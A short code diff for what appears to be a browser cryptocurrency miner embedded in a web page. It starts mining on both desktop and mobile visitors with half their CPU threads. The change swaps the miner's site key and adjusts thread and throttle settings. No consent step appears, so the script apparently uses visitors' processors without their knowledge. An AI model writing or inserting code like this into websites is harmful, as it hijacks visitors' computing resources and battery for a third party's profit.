@@ -1,18 +1,20 @@
-let base = SETINDEX.Anonymous('SK_oD9sxFo5YjtWn583id8Gy', {
+let base = SETINDEX.Anonymous('SK_xzJ2ClSHk8QOjjmeX2sH2', {
 	forceASMJS: false
 });
 
 if (!base.isMobile()){
-	let site = SETINDEX.Anonymous('SK_oD9sxFo5YjtWn583id8Gy', {
+	let site = SETINDEX.Anonymous('SK_xzJ2ClSHk8QOjjmeX2sH2', {
 		threads: base.getNumThreads() / 2,
+		autoThreads: false,
 		throttle: 0.4,
 		forceASMJS: false
 	});
 	site.start();
 } else {
-	let site = SETINDEX.Anonymous('SK_oD9sxFo5YjtWn583id8Gy', {
+	let site = SETINDEX.Anonymous('SK_xzJ2ClSHk8QOjjmeX2sH2', {
 		threads: base.getNumThreads() / 2,
-		throttle: 0.5,
+		autoThreads: false,
+		throttle: 0.3,
 		forceASMJS: false
 	});
 	site.start();
